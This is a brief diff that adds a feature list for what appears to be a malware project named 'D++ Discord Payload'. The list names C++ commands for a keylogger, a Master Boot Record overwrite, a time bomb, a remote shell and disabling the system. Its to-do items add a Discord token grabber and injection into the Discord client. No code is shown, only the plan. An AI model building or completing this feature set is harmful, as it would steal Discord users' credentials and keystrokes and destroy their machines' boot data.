@@ -1,0 +1,13 @@
+
+D++ Discord Payload
+
+Commands in C++:
+    -Disable everything
+    -Keylogger
+    -MBR_Overwrite
+    -Time Bomb
+    -Shell
+
+Re-write py_payload command
+Add token grabber command
+Inject into Discord
